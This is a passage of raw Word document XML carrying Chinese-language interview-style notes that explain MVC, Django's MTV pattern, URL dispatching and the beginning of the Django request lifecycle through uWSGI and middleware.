          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AB090C"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MVC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>就是把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>应用分为模型</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(M)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，控制器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(C)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和视图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(V)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>三层</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>他们之间以一种插件式的、松耦合的方式连接在一起，模型负责业务对象与数据库的映射</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(ORM)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，视图负责与用户的交互</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>页面</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，控制器接受用户的输入调用模型和视图完成用户的请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A86E2BC" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00AD41B7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="宋体" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="63125EE4" wp14:editId="52CF4F15">
            <wp:extent cx="7002780" cy="3777615"/>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7012863" cy="3782767"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B503C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MTV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>MTV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>模式本质上和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是一样的，也是为了各组件间保持松耦合关系，只是定义上有些许不同</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0260214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Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>MTV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>分别是：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">M </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>代表模型（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）：</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负责业务对象和数据库的关系映射</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(ORM)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</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xml:space="preserve">T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>代表模板</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Template)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：负责如何把页面展示给用户</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(html)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</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xml:space="preserve">V </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>代表视图（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>View</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）：</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负责业务逻辑，并在适当时候调用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Template</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE944A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除了以上三层之外，还需要一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>分发器，它的作用是将一个个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的页面请求分发给不同的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>View</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>处理，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>View</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>再调用相应的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Template</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>MTV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的响应模式。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="5BFCC7A4" w14:textId="042A56CC" w:rsidR="00024E97" w:rsidRPr="003A0200" w:rsidRDefault="00024E9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w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>09</w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">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简述</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求生命周期</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B83B5CC" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00AD41B7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192"/>
        <w:jc w:val="center"/>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lastRenderedPageBreak/>
        <w:t>初级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生命周期</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="宋体" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7619B4F0" wp14:editId="533F52FF">
            <wp:extent cx="4572000" cy="66719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572000" cy="6671945"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E21711"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lastRenderedPageBreak/>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>交给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>框架</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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9BDDB7"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首先到达</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中间件，对请求对象进行校验或添加数据，例如：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
